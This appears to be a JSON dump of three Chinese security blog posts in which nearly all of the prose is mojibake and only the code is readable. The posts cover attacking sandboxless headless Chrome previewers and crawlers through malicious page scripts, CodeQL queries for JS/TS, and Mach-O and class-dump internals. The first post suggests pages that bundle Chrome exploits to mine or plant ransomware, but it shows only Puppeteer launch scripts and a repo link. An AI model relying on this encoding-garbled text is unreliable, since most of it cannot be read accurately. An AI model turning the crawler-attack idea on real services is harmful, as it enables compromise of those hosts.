æ¥è¯´æä¸ªdemoé‚£å€’è¿˜å¥½ï¼Œå¦‚æœè¯´æ˜¯ç”¨äºå®é™…é¡¹ç›®ï¼Œæ¯”å¦‚å†™é¢„è§ˆæœåŠ¡ï¼Œçˆ¬è™«ç­‰é¡¹ç›®ï¼Œè¿˜æ˜¯ç›´æ¥ä½¿ç”¨äº†è¿™äº›å±é™©çš„å‚æ•°é‚£å°±å¤ªå±é™©äº†ã€‚ çº¿ä¸Šç¯å¢ƒè¦æ±‚ç¨³å®šï¼Œä¸ä¸€å®šæ˜¯æœ€æ–°ç‰ˆæœ¬nodeï¼Œå³ä¸ä¸€å®šæ˜¯æœ€æ–°ç‰ˆæœ¬Chrome å±é™©çš„å‚æ•°(æ¯”å¦‚--disable-web-security)ï¼Œæ²¡æœ‰å¼€å¯æ²™ç®±ï¼Œå¼€äº†è°ƒè¯•ç«¯å£ç­‰ è€ç‰ˆæœ¬Chrome + NOSANDBOX = RCE ğŸ¤” è‡³æ­¤ï¼Œæˆ‘è®¤ä¸ºå¯ä»¥æä¸ªDemoéªŒè¯ä¸€ä¸‹è¿™ä¸ªæ”»å‡»æ€è·¯æ˜¯å¦å¯è¡Œã€‚ DemoPagesè¿™é‡Œç›´æ¥æ‰’äº†xlabæŸæ¬¡å®‰å…¨æ¨é€ï¼Œç„¶ååœ¨æœ¬åœ°è·‘èµ·æ¥ï¼Œå‡è£…æ˜¯ä¸€ä¸ªç›®æ ‡ç½‘é¡µï¼š ä¸‹é¢æä¸¤ä¸ªåœºæ™¯å§ï¼Œç¬¬ä¸€ä¸ªæ˜¯é¢„è§ˆï¼Œç®€åŒ–ä¸€ä¸‹ï¼Œæˆªå›¾å¥½äº†ï¼›ç¬¬äºŒä¸ªæ˜¯çˆ¬è™«ï¼Œçˆ¬å–è¿™ç½‘é¡µä¸Šçš„ä¿¡æ¯ã€‚ Demo1 : é¢„è§ˆé¢„è§ˆçš„åœºæ™¯æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚å¸¸è§çš„IMä¸­ï¼Œå‘é€çš„URLå¯èƒ½ä¼šè¢«æ¸²æŸ“æˆâ€œå¡ç‰‡â€ï¼Œä¸åŒIMå¤„ç†ä¸ä¸€æ ·ï¼Œä¸€èˆ¬æ¥è¯´åªæœ‰ç™½åå•æ‰ä¼šè¿™æ ·ã€‚ æˆ‘è¿™è¾¹ä¸ä¼šæå¤ªå¤æ‚çš„ä¸œè¥¿ï¼Œå°±ç›´æ¥ç”¨æˆªå›¾ä»£æ›¿äº†ï¼Œç›´æ¥ä¹Ÿä»ç½‘ä¸Šâ€ä¸œæ‹¼è¥¿å‡‘â€œç‚¹ä»£ç ï¼š 1234567891011121314151617181920212223const puppeteer = require('puppeteer');(async () =&gt; { targetUrl = \"https://www.google.com.hk\"; try { const args = process.argv.slice(2) targetUrl = args[0]; } catch (e) { console.log(e); } // FIXME : I should open SANDBOX, this cmdline is wrong !!! const browser = await puppeteer.launch({ executablePath: '/usr/bin/google-chrome', args: ['--no-sandbox', '--disable-setuid-sandbox'] }); const page = await browser.newPage(); await page.goto(targetUrl); await page.screenshot({ path: 'res.png' }); await browser.close();})(); åŠŸèƒ½ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œé¢„è§ˆæŒ‡å®šçš„ç½‘é¡µï¼Œæˆ‘è¿™é‡Œæå¾—ç®€å•ï¼Œç›´æ¥æˆªå›¾ç„¶åä¿å­˜ï¼ŒIMé‡Œé‚£ç§å¡ç‰‡å¼ä¸çŸ¥é“æ€ä¹ˆæï¼Œå°±æ²¡å»å°è¯•ï¼Œä¸è¿‡ä¹Ÿæ˜¯ä¸ªæ”»å‡»é¢å•¦ ğŸ¤£ è·‘ä¸€ä¸‹Demoï¼š å¦‚æœåœ¨é¡µé¢é‡ŒåŠ è½½æ¶æ„çš„JSå‘¢ï¼Ÿ ç›´æ¥ä½¿ç”¨script æ ‡ç­¾åŠ è½½ åŠ å…¥jsï¼Œä½¿ç”¨js web workeråŠ è½½ BOOM : Demo2 : çˆ¬è™«è¿™é‡Œç›´æ¥æŠ„äº†https://www.anquanke.com/post/id/103350 é‡Œçš„ä»£ç : 1234567891011121314151617181920212223242526272829303132333435$ cat crawler.js const puppeteer = require('puppeteer');(async () =&gt; { // FIXME : I should open SANDBOX, this cmdline is wrong !!! const browser = await puppeteer.launch({ executablePath: '/usr/bin/google-chrome', args: ['--no-sandbox', '--disable-setuid-sandbox'] }); const page = await browser.newPage(); await page.goto('http://localhost/foo.html', { waitUntil: 'networkidle0' }); //count let eleCount = await page.evaluate((sel) =&gt; { return document.getElementsByClassName(sel).length; }, 'category'); if(eleCount != 0){ let htmlArray = await page.evaluate((sel, eleCount) =&gt; { let element = document.querySelectorAll(sel); let htmlArray = []; for(let i = 0; i &lt;= eleCount; i++){ htmlArray[i] = element[i].innerText; } htmlArray.shift(); return htmlArray; }, 'p', eleCount); console.log(htmlArray); } await browser.close();})(); é¢„æœŸè¡Œä¸ºï¼š çœ‹èµ·æ¥ä¸é”™ : ) åŠ å…¥æ¶æ„çš„JSä¹‹å: è¿™é‡Œæœ‰ä¸ªåœ°æ–¹ä¸å®Œç¾ï¼Œæˆ‘æœ¬æ¥å°è¯•js web workeråŠ è½½expï¼Œæƒ³ çˆ¬è™«æ­£å¸¸å·¥ä½œï¼Œçˆ¬å–åˆ°éœ€è¦çš„å†…å®¹ï¼Œexpåœ¨åå°è·‘ï¼Œä½†æ˜¯æˆ‘å‘ç°è¦ä¹ˆæ—¶é—´ä¸å¤Ÿæˆ‘è·‘expï¼ˆéœ€è¦çˆ¬è™«åœç•™çš„ä¹…ä¸€ç‚¹ï¼‰ï¼Œè¦ä¹ˆå°±expè·‘äº†ï¼Œä½†æ˜¯å†…å®¹æ²¡çˆ¬å–åˆ°ã€‚è¿™ç‚¹æˆ‘è®¤ä¸ºåº”è¯¥å¯ä»¥è§£å†³ï¼Œå¦‚æœæœ‰çŸ¥é“çš„å‰ç«¯å¤§ä½¬å¯ä»¥åˆ†äº«ä¸€ä¸‹~ åè®°é‚£ä¹ˆæ˜¯å¦å­˜åœ¨è¿™æ ·ä¸€æ¡æ”»å‡»é“¾ï¼Œé’ˆå¯¹çˆ¬è™«æˆ–è€…ä¸€äº›Headless Chromeçš„æœåŠ¡ï¼š æ¶æ„æ„é€ é¡µé¢ï¼Œé›†æˆå¤šä¸ªExploitï¼Œè¦†ç›–å¤§é‡Chromeç‰ˆæœ¬ï¼Œæ‰“è¿›å»å°±æŒ–çŸ¿orç§å‹’ç´¢ï¼Ÿ æœ€åè¿˜æ˜¯å»ºè®®ä»¥å®˜æ–¹æ–‡æ¡£ä¸ºå‡†ï¼Œå†™ä»£ç å‚è€ƒæ–‡æ¡£è€Œä¸æ˜¯ä»ç½‘ä¸Šçš„æŠ€æœ¯æ–‡ç« é‡Œæ‘˜ : ) Demo &amp; Exphttps://github.com/o0xmuhe/headless_chrome_demo å‚è€ƒ https://developers.google.com/web/updates/2017/04/headless-chrome https://www.anquanke.com/post/id/103350 https://xz.aliyun.com/t/2120 https://wangxin1248.github.io/python/2018/09/python3-spider-8.html https://zhuanlan.zhihu.com/p/29207391","link":"/2021/05/26/Chrome-headless-exploit/"},{"title":"CodeQL JS&#x2F;TS Journey","text":"å…³äºä¹‹å‰åšè¿‡çš„ä¸€äº›ä½¿ç”¨CodeQLå¯¹JS/TSé¡¹ç›®åšæ‰«æçš„ç¬”è®°ã€‚ å…³äºæ„å»ºæ•°æ®åº“è¿‡ç¨‹å¯¹äºJS/TSçš„é¡¹ç›®æ¥è¯´ï¼ŒCodeQLç»Ÿä¸€éƒ½æ˜¯ --language=javascript çš„å‚æ•°å¤„ç†çš„ï¼Œè€Œä¸”å®ƒä¸»è¦æ˜¯æ‰«æï¼Œè§£æï¼Œç„¶åæ„å»ºæ•°æ®åº“ï¼Œå¯¹äºå°é¡¹ç›®ç›´æ¥é»˜è®¤å‚æ•°åº”è¯¥æ˜¯okçš„ï¼š 12codeql database create --language=javascript &lt;your_prj&gt;# codeql database bundle -o &lt;your_prj_db&gt;.zip &lt;your_prj&gt; ä½†æ˜¯å¯¹äºæ¯”è¾ƒå¤§å‹çš„é¡¹ç›®æ¥è¯´ï¼Œå› ä¸ºCodeQLæ˜¯Javaå†™çš„ï¼Œæ‰€ä»¥å¯èƒ½ä¼šå­˜åœ¨å†…å­˜ä¸è¶³å¯¼è‡´æ„å»ºæ•°æ®åº“å¤±è´¥çš„æƒ…å†µï¼š 12FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed -JavaScript heap out of memory é»˜è®¤ç»™çš„å†…å­˜æ˜¯2400MBï¼Œå¤§é¡¹ç›®å¿…ç„¶ä¸å¤Ÿå•Šï¼Œæ–‡ä»¶å¤ªå¤šäº†ã€‚ æ‰¾äº†ä¸€åœˆæ²¡æœ‰è§£å†³æ–¹æ¡ˆï¼Œç´¢æ€§ç›´æ¥æå‡ºJD_GUIæŠŠå®ƒçš„jaråŒ…ç»™åç¼–è¯‘äº†ï¼Œå‘ç°æ˜¯é€šè¿‡ç¯å¢ƒå˜é‡æ§åˆ¶çš„ï¼š 1export SEMMLE_TYPESCRIPT_RAM=8000 è¿™ä¸ªä¸æ˜¯ç»™JAVAçš„é‚£ä¸ªå†…å­˜è®¾ç½®(-J-Xmx1234M) Queryæ¥å£å‡½æ•°1234567891011interface FooInterface{4//...}export interface outerApiConfig {4foo: (params: xxxxx) =&gt; Promise&lt;{ // whatever ..}&gt;;44bar: (params: FooInterface) =&gt; Promise&lt;{ // whatever..}&gt;;44// ...} æ‹¿è¿™ä¸ªDemoä¸ºä¾‹ï¼Œå¾ˆå¤šæ¥å£å‡½æ•°ç»Ÿä¸€å¯¼å‡ºï¼Œéœ€è¦å€ŸåŠ©InterfaceDeclaration æ¥æ‰¾ï¼Œä¸è¿‡æˆ‘çš„æ–¹æ³•æœ‰ç‚¹â€œç¬¨â€ã€‚ 123456789101112import javascriptpredicate isOuterAPIs(Function f){ exists(InterfaceDeclaration apis | apis.getIdentifier().toString() = \"outerApiConfig\" and apis.getAMember().getName() = f.getName() )}from Function fwhere isOuterAPIs(f)select f.getName() æˆ‘è¿™é‡Œå®ç°å¾ˆç²—æš´ï¼Œå°±æ˜¯é™åˆ¶å‡½æ•°å(å­—ç¬¦ä¸²å€¼)å’ŒInterfaceé‡Œæˆå‘˜åå­—(å­—ç¬¦ä¸²å€¼)ä¸€è‡´ï¼Œå°±è®¤ä¸ºè¿™ä¸ªå‡½æ•°æ˜¯å¯¼å‡ºæ¥å£ä¸­çš„å‡½æ•°ã€‚ ç‰¹å®šå‚æ•°çš„å¤„ç†åœ¨æˆ‘çš„éœ€æ±‚ä¸­ï¼Œæˆ‘éœ€è¦é‡ç‚¹å…³æ³¨ï¼Œå‚æ•°ä¸­å¸¦æœ‰è·¯å¾„çš„å‡½æ•°ï¼Œæ¢è¨€ä¹‹å°±æ˜¯éœ€è¦è¯†åˆ«å‡ºè¿™ä¹ˆå¤šæ¥å£å‡½æ•°ä¸­ï¼Œå‚æ•°å¸¦æœ‰pathçš„æƒ…å†µï¼Œé‚£ä¹ˆå¾ˆç›´æ¥çš„æ€è·¯å°±æ˜¯åˆ©ç”¨æ­£åˆ™ï¼Œä½†æ˜¯åœ¨å®é™…çš„åœºæ™¯ä¸‹ï¼Œä½ ä¼šå‘ç°ä»£ç çœŸçš„å†™å‡ºäº†â€œèŠ±â€ï¼Œä¸æ˜¯å¸¸è§„çš„queryèƒ½è¦†ç›–çš„ã€‚ 12345678910foo: (params: WTFParams) =&gt; Promise&lt;....&gt;;bar: (params: { arg: string }) =&gt; Promise&lt;{ ...}&gt;; function magic(x) { return ()=&gt;{ //... };} å‚æ•°æ˜¯ä¸€ä¸ªinterfaceï¼Œä½ éœ€è¦å¯¹è¿™ä¸ªinterfaceå†é™åˆ¶ï¼Œå³è¿™ä¸ªinterfaceçš„æˆå‘˜æ˜¯ä¸æ˜¯path å‚æ•°ç›´æ¥å°±æ˜¯ {arg : string} è¿™ç±»æƒ…å†µ å¥‡æ€ªçš„å‡½æ•°å†™æ³•ï¼Œå‡½æ•°ä½“åœ¨returné‡Œ 123456789101112131415161718class PathParamInterfaceType extends InterfaceType{ PathParamInterfaceType(){ getInterface().getAMember().getName().toLowerCase().indexOf(\"path\") &gt; 0 }}predicate isParamPath(Function f){ ( f.getAParameter().getType() instanceof PathParamInterfaceType or f.getAParameter().getType().toString().toLowerCase().indexOf(\"path\") &gt; 0 ) or ( f.getNumParameter() = 0 and f.getAReturnStmt().getExpr().(Function).getAParameter().getType().toString().toLowerCase().indexOf(\"path\") &gt; 0 )} å¿…é¡»ä¾èµ–TaintTrackingå—æœ€åä¸€ä¸ªé—®é¢˜æ¯”è¾ƒç®€å•äº†ï¼Œå°±æ˜¯æœ‰äº†sourceï¼Œç„¶åå†æ‰¾åˆé€‚çš„sinkï¼Œçœ‹æœ‰æ²¡æœ‰è·¯å¾„å°±è¡Œäº†ï¼›ä½†æ˜¯å…¶å®è¿˜æœ‰ä¸€ç§åŠæ³•ä¼šæ¥å¾—æ›´ç›´æ¥ï¼Œå°±æ˜¯åˆ©ç”¨ä¼ é€’é—­åŒ…ï¼Œä½†æ˜¯ä¼šå¸¦æ¥æ¯”è¾ƒå¤šçš„è¯¯æŠ¥ï¼Œå¥½å¤„æ˜¯å®ç°èµ·æ¥ç®€å•ï¼Œæƒ³è¦æ’é™¤è¯¯æŠ¥ï¼Œåªéœ€è¦å¢åŠ é™åˆ¶å³å¯ï¼Œçœ‹å…·ä½“éœ€æ±‚å§ï¼Œå“ªä¸ªæ–¹æ³•åˆé€‚ç”¨å“ªä¸ªã€‚ CodeQLçš„JS/TSéƒ¨åˆ†å®ç°ä¸å¦‚cppå¤šï¼Œæ‰€ä»¥æœ‰äº›predicateéœ€è¦è‡ªå·±æ‰‹åŠ¨å®ç°ï¼Œæ¯”å¦‚ç”¨cppåšqueryå¯ä»¥ï¼š 123456FunctionCall getFunctionToACall(FunctionCall fc){ result = fc.getBasicBlock().getEnclosingFunction().getACallToThisFunction()}select getFunctionToACall*(FunctionCall fc) ä½†æ˜¯JS/TSéƒ¨åˆ†æ²¡æœ‰getACallToThisFunction ï¼Œæ ¹æ®åŸç†ï¼Œæ‰‹åŠ¨å®ç°ä¸€ä¸ªå³å¯ï¼š 12345678910CallExpr getACallToThisFunction(Function f){ exists( CallExpr c | c.getCalleeName() = f.getName() and result = c )}CallExpr getFunctionToACall(CallExpr call){ result = getACallToThisFunction(call.getEnclosingFunction())} æ‰€ä»¥ï¼Œå¦‚æœæƒ³è¦æŸ¥è¯¢fooå‡½æ•°çš„ä¼ é€’é—­åŒ…ï¼Œå°±å¯ä»¥ï¼š 123from CallExpr callwhere call.getCalleeName() = \"foo\"select getFunctionToACall*(call) å‚è€ƒhttps://xz.aliyun.com/t/7482 CodeQL for research https://ctftime.org/writeup/22177 https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/codeql_xnu.md https://codeql.github.com/docs/codeql-cli/","link":"/2021/06/01/CodeQL-JS-TS-Journey/"},{"title":"iOS RE 4 beginners 1 - MachO &amp;&amp; class-dump","text":"roadmapä¹‹å‰åœ¨ iosreçœ‹åˆ°ä¸€å¼ æ¯”è¾ƒç³»ç»Ÿçš„iOSé€†å‘å­¦ä¹ è·¯çº¿å›¾ï¼Œå› ä¸ºæ¥è§¦è¿‡ä¸€æ®µæ—¶é—´macOSä¸ŠæœåŠ¡çš„æ¼æ´æŒ–æ˜ï¼Œæ‰€ä»¥å¯¹*OSå®‰å…¨è¿˜æ˜¯æŒºæœ‰å…´è¶£çš„ï¼Œä¹Ÿä¸€ç›´æƒ³ç³»ç»Ÿæ€§åœ°å­¦ä¹ ä¸‹iOSé€†å‘ï¼Œä¹‹å‰çš„ä¸€ç›´ä¸æˆä½“ç³»ï¼Œä¹Ÿå¾ˆé›¶ç¢ï¼Œæ­£å¥½å¯¹ç€è¿™ä¸ªå›¾é‡æ„ä¸‹çŸ¥è¯†ä½“ç³»ã€‚ macho file format ç±»ä¼¼Windows/Linuxå¹³å°é€†å‘å­¦ä¹ ï¼Œé¦–å…ˆè¦å­¦ä¹ æ­£å‘å¼€å‘çš„åŸºç¡€çŸ¥è¯†ï¼Œä»¥åŠæ¶‰åŠçš„æ–‡ä»¶æ ¼å¼(æŒ‡å¯æ‰§è¡Œæ–‡ä»¶)ï¼š Windows - PE Linux - ELF *OS - MachO æ ¹æ®roadmapä¸­çš„appåˆ†ææµç¨‹ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯â€œç ¸å£³â€œï¼Œå°±æ˜¯åœ¨æ ¹æ®æ–‡ä»¶æ ¼å¼åšæ–‡ç« ï¼Œå› ä¸ºmachoæ–‡ä»¶æ˜¯åŠ å¯†çš„ï¼Œè¢«åŠ è½½åˆ°å†…å­˜æ‰§è¡Œçš„æ—¶å€™æ‰ä¼šè§£å¯†ï¼Œæ‰€ä»¥æˆ‘ä»¬åšé™æ€åˆ†æï¼Œéœ€è¦æŠŠå†…å­˜ä¸­è§£å¯†ä¹‹åçš„å¯æ‰§è¡Œæ–‡ä»¶dumpå‡ºæ¥ï¼Œå¹¶ä¿®å¤æ–‡ä»¶æ‰å¯ä»¥æ‹–å…¥hopper/IDAæ­£å¸¸åˆ†æã€‚ Overview æˆ‘æ„Ÿè§‰è¿™äº›å¯æ‰§è¡Œæ–‡ä»¶å¤§åŒå°å¼‚çš„å‘³é“ï¼ŒåŸºæœ¬éƒ½æ˜¯æ–‡ä»¶å¤´+å„ç§èŠ‚åŒºã€‚ åœ¨macOSä¸Šä½ å¯ä»¥ä½¿ç”¨ï¼š MachOView MachOExplorer æ¥æŸ¥çœ‹ä¸€ä¸ªmachoæ–‡ä»¶çš„ç»“æ„ï¼Œæ¨èå‰è€…ï¼Œåè€…ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ€»æ˜¯å¡å¡çš„ï¼Œè€Œä¸”å¾ˆå®¹æ˜“å´©æºƒ :( æ€»ä½“ä¸Šæ¥çœ‹ï¼Œmachoæ–‡ä»¶æ ¼å¼å¯ä»¥çœ‹åšï¼š Header Load Commands LC_SEGMENT TEXT DATA LINKEDIT LC_CODESIGNATURE LC_DYLD_INFO_ONLY LC_XXXX_DYLIB Data Segment(1-n) Headeråªå…³æ³¨å‡ ä¸ªåŸºæœ¬å­—æ®µ magic number : è¡¨ç¤ºmachoçš„ç±»å‹ï¼ŒFAT, ARMv7,ARM64,x86_64 FAT å°±æ˜¯ â€œèƒ–æ–‡ä»¶â€ï¼Œè¡¨ç¤ºè¿™ä¸ªæ–‡ä»¶é‡ŒåŒ…å«äº†å¤šä¸ªæ¶æ„çš„MachOæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨lipoåˆ†ç¦» CPU Type, CPU SubType : arch Number of load commands : Load commandsçš„æ•°é‡ flagsï¼šè¡¨ç¤ºä¸€äº›æ ‡è¯†ä½ï¼Œæ¯”å¦‚æ˜¯å¦å¼€äº†PIEï¼Œchecksecå¯ä»¥ä»è¿™é‡Œè·å–ä¸€äº›ä¿¡æ¯ã€‚ reversedï¼š64ä½ä¿ç•™å­—æ®µ Load Commands å³å‘Šè¯‰æ“ä½œç³»ç»Ÿï¼Œè¯¥å¦‚ä½•åŠ è½½æ–‡ä»¶ä¸­çš„æ•°æ®ã€‚ LC_SEGMENT_64ï¼šå®šä¹‰ä¸€ä¸ªæ®µï¼ŒåŠ è½½åè¢«æ˜ å°„åˆ°å†…å­˜ä¸­ï¼ŒåŒ…æ‹¬é‡Œé¢çš„èŠ‚ã€‚ æ¯”å¦‚ä»£ç æ®µ æ•°æ®æ®µ : TEXT ä»£ç æ®µ DATA æ•°æ®æ®µ LC_DYLD_INFO_ONLYï¼šè®°å½•äº†æœ‰å…³é“¾æ¥çš„é‡è¦ä¿¡æ¯ï¼ŒåŒ…æ‹¬åœ¨_LINKEDITä¸­åŠ¨æ€é“¾æ¥ ç›¸å…³ä¿¡æ¯çš„å…·ä½“åç§»å’Œå¤§å°ã€‚ONLYè¡¨ç¤ºè¿™ä¸ªåŠ è½½æŒ‡ä»¤æ˜¯ç¨‹åºè¿è¡Œæ‰€å¿…éœ€çš„ï¼Œå¦‚æœæ—§çš„ é“¾æ¥å™¨æ— æ³•è¯†åˆ«å®ƒï¼Œç¨‹åºå°±ä¼šå‡ºé”™ã€‚ LC_SYMTABï¼šä¸ºæ–‡ä»¶å®šä¹‰ç¬¦å·è¡¨å’Œå­—ç¬¦ä¸²è¡¨ï¼Œåœ¨é“¾æ¥æ–‡ä»¶æ—¶è¢«é“¾æ¥å™¨ä½¿ç”¨ï¼ŒåŒæ—¶ä¹Ÿç”¨äºè°ƒè¯•å™¨æ˜ å°„ç¬¦å·åˆ°æºæ–‡ä»¶ã€‚ç¬¦å·è¡¨å®šä¹‰çš„æœ¬åœ°ç¬¦å·ä»…ç”¨äºè°ƒè¯•ï¼Œè€Œå·²å®šä¹‰å’Œæœªå®šä¹‰çš„externalç¬¦å·è¢«é“¾æ¥å™¨ä½¿ç”¨ã€‚ LC_DYSYMTAB:å°†ç¬¦å·è¡¨ä¸­ç»™å‡ºç¬¦å·çš„é¢å¤–ç¬¦å·ä¿¡æ¯æä¾›ç»™åŠ¨æ€é“¾æ¥å™¨ã€‚ LC_LOAD_DYLINKERï¼šé»˜è®¤çš„åŠ è½½å™¨è·¯å¾„ã€‚ /usr/lib/dyld LC_UUIDï¼šç”¨äºæ ‡è¯†MachOæ–‡ä»¶çš„IDï¼Œä¹Ÿç”¨äºå´©æºƒå †æ ˆå’Œç¬¦å·æ–‡ä»¶çš„å¯¹åº”è§£æã€‚ LC_VERSION_MIN_IPHONEOSï¼šç³»ç»Ÿè¦æ±‚çš„æœ€ä½ç‰ˆæœ¬ã€‚ LC_SOURCE_VERSIONï¼šæ„å»ºäºŒè¿›åˆ¶æ–‡ä»¶çš„æºä»£ç ç‰ˆæœ¬å·ã€‚ LC_MAINï¼šç¨‹åºçš„å…¥å£ã€‚dyldè·å–è¯¥åœ°å€ï¼Œç„¶åè·³è½¬åˆ°è¯¥å¤„æ‰§è¡Œã€‚ LC_ENCRYPTION_INFO_64ï¼šæ–‡ä»¶æ˜¯å¦åŠ å¯†çš„æ ‡å¿—ï¼ŒåŠ å¯†å†…å®¹çš„åç§»å’Œå¤§å°ã€‚ lldb dump ç ¸å£³ä¿®å¤æ–‡ä»¶ä¹‹åï¼Œéœ€è¦ä¿®æ”¹è¯¥æ ‡è¯†ä½ä»¥ç¡®ä¿æ­£å¸¸åæ±‡ç¼–æ–‡ä»¶ã€‚ LC_LOAD_DYLIB:ä¾èµ–çš„åŠ¨æ€åº“ï¼ŒåŒ…æ‹¬åŠ¨æ€åº“åç§°ã€å½“å‰ç‰ˆæœ¬å·ã€å…¼å®¹ç‰ˆæœ¬å·ã€‚ â€œotool -L xxxâ€å‘½ä»¤æŸ¥çœ‹ LC_RPATHï¼š Runpath Search Paths, @rpath æœç´¢çš„è·¯å¾„ã€‚ LC_FUNCTION_STARTSï¼šå‡½æ•°èµ·å§‹åœ°å€è¡¨ï¼Œä½¿è°ƒè¯•å™¨å’Œå…¶ä»–ç¨‹åºèƒ½å¾ˆå®¹æ˜“åœ°çœ‹åˆ°ä¸€ä¸ªåœ°å€æ˜¯å¦åœ¨å‡½æ•°å†…ã€‚ LC_DATA_IN_CODEï¼šå®šä¹‰åœ¨ä»£ç æ®µå†…çš„éæŒ‡ä»¤çš„è¡¨ã€‚ LC_CODE_SIGNATUREï¼šä»£ç ç­¾åä¿¡æ¯ã€‚ codesign -d [filename] Data-Segmentså„ç§èŠ‚åŒºï¼Œæ¯”å¦‚ä»£ç æ®µï¼Œæ•°æ®æ®µï¼Œåªè¯»æ•°æ®æ®µç­‰ï¼š è¿™é‡Œå¯ä»¥çœ‹åˆ°å¾ˆå¤š__DATA, __objc__? èŠ‚åŒºï¼ŒSymbol Table String Tableä¹Ÿå•ç‹¬åˆ—äº†å‡ºæ¥ã€‚ __objc_protolist __objc_classlist __objc_catlist section â€¦ è¿™äº›èŠ‚åŒºä¿å­˜äº†OCä¸­ç±»åï¼Œå‡½æ•°åç­‰ä¿¡æ¯ï¼Œè¿™å°±ä¸ºä»MachOä¸­dumpå‡ºæ¥å¤´æ–‡ä»¶æ‰“ä¸‹äº†åŸºç¡€ã€‚ Get class info from macho file__DATA, __objc_protolistèŠ‚åŒºï¼š å­˜å‚¨çš„éƒ½æ˜¯æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªåˆä¸€ä¸ªprotocolçš„ç»“æ„ï¼Œå¯ä»¥å‚è€ƒobjcçš„ä»£ç  : 1234567891011121314151617181920212223struct protocol_t : objc_object { const char *mangledName; struct protocol_list_t *protocols; method_list_t *instanceMethods; method_list_t *classMethods; method_list_t *optionalInstanceMethods; method_list_t *optionalClassMethods; property_list_t *instanceProperties; uint32_t size; // sizeof(protocol_t) uint32_t flags; // Fields below this point are not always present on disk. const char **_extendedMethodTypes; ...... }struct objc_object {private: isa_t isa;public: ...} æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŒ‰ç…§ç»“æ„ä½“ç´¢å¼• __DATA, __objc_protolist é‡ŒæŒ‡é’ˆæŒ‡å‘çš„ä½ç½®çš„æ•°æ®ï¼Œå°±å¯ä»¥è§£æå‡ºæ¥protocolçš„ç±»å‹ï¼Œåå­—ï¼Œæ–¹æ³•ç­‰ä¿¡æ¯ã€‚ class-dump read notesenvmacos11.4 + xcode12 compileQ : openssl/aes.h not found A : add header file path 12export LDFLAGS=\"-L/usr/local/opt/openssl/lib\"export CPPFLAGS=\"-I/usr/local/opt/openssl/include\" XCodeä¸­çš„é…ç½®æ˜¯: Q : Library not found for -lcrypto A : add the missing dylib raed &amp;&amp; debugæ ¸å¿ƒé€»è¾‘å°±çœ‹ 12345678910111213141516171819202122- (void)processObjectiveCData;{ for (CDMachOFile *machOFile in self.machOFiles) { CDObjectiveCProcessor *processor = [[[machOFile processorClass] alloc] initWithMachOFile:machOFile]; [processor process]; [_objcProcessors addObject:processor]; }}- (void)process;{ if (self.machOFile.isEncrypted == NO &amp;&amp; self.machOFile.canDecryptAllSegments) { [self.machOFile.symbolTable loadSymbols]; [self.machOFile.dynamicSymbolTable loadSymbols]; [self loadProtocols]; [self.protocolUniquer createUniquedProtocols]; // Load classes before categories, so we can get a dictionary of classes by address. [self loadClasses]; [self loadCategories]; }} 1. symbolTable loadSymbolsLoad Commands é‡Œæ‰¾åˆ° LC_SYMTABï¼Œç„¶åæ‰¾åˆ° __DATA(ä¾èµ–å±æ€§ RW)ã€‚ ç„¶ååˆ©ç”¨ LC_SYMTAB åˆå§‹åŒ–äº†cursorå¼€å§‹éå†æ‰¾ç¬¦å·ã€‚ strtab ä» string table å¼€å§‹ ï¼š ä¸€ä¸ª symbolèµ·å§‹ä½ç½®ï¼Œä¸€ä¸ªstringèµ·å§‹ä½ç½®ã€‚ ç„¶åæ ¹æ® arm è¿˜æ˜¯ x64 èµ°ä¸åŒçš„é€»è¾‘(è¿™é‡Œç›®æ ‡æ˜¯ARM64çš„Binary) : å¼€å§‹è§£æ symbol tableï¼Œitem by item 12345string table index --&gt; åœ¨string tableé‡Œæ‰¾åˆ°å¯¹åº”çš„ stringtypesection indexdescvalue ç„¶åæ ¹æ®string table indexé‡Œæ‰¾åˆ°å¯¹åº”çš„stringï¼Œæ”¾åˆ°symbolsæ•°ç»„é‡Œï¼Œ æ ¹æ® string çš„ value åˆ¤æ–­æ˜¯ä¸æ˜¯ classï¼Œè¿™é‡Œæ˜¯æ ¹æ®å­—ç¬¦ä¸²çš„å¼€å¤´æ˜¯ä¸æ˜¯ @&quot;*OBJC_CLASS*$_&quot;ã€‚ å¯¹äºè§£æå‡ºæ¥class nameï¼Œæ·»åŠ åˆ° class symbols dicté‡Œï¼Œè¿™æ ·å¤„ç†ä¹‹åï¼Œsymbolsï¼Œ classSymbolséƒ½æœ‰äº†ã€‚ 2. dynamicSymbolTable loadsymbolsç±»ä¼¼1 3. loadProtocolsä» __DATA , __objc_protolist è¯»å– å¯¹åº”çš„value æ¯”å¦‚å¾—åˆ°åœ°å€0x1009ccc58 èµ°åˆ° - (CDOCProtocol *)protocolAtAddress:(uint64_t)address åˆå§‹åŒ–å¯¹åº”çš„CDOCProtocolå¯¹è±¡ ä¾èµ–è¿™ä¸ªåœ°å€ï¼Œä»æ–‡ä»¶å¯¹åº”åœ°å€è¯»å–å‡ºæ¥ è¿™ä¸ª protoçš„ç›¸å…³ä¿¡æ¯: 123456789101112struct cd_objc2_protocol objc2Protocol;objc2Protocol.isa = [cursor readPtr];objc2Protocol.name = [cursor readPtr];objc2Protocol.protocols = [cursor readPtr];objc2Protocol.instanceMethods = [cursor readPtr];objc2Protocol.classMethods = [cursor readPtr];objc2Protocol.optionalInstanceMethods = [cursor readPtr];objc2Protocol.optionalClassMethods = [cursor readPtr];objc2Protocol.instanceProperties = [cursor readPtr];objc2Protocol.size = [cursor readInt32];objc2Protocol.flags = [cursor readInt32];objc2Protocol.extendedMethodTypes = 0; name protocolsè¿™äº›å­—æ®µæ˜¯ä¸€ä¸ªåœ°å€ï¼ŒæŒ‡å‘å¯¹åº”çš„å€¼(å­—ç¬¦ä¸²/æ•°ç»„) æœ€åå‚ç…§objc2Protocolçš„å€¼ï¼Œåˆ†åˆ«è·å–protocol çš„ nameï¼Œ å„ç§methodsï¼Œå±æ€§ç­‰ï¼Œåˆå§‹åŒ–äº†protocolå¯¹è±¡ 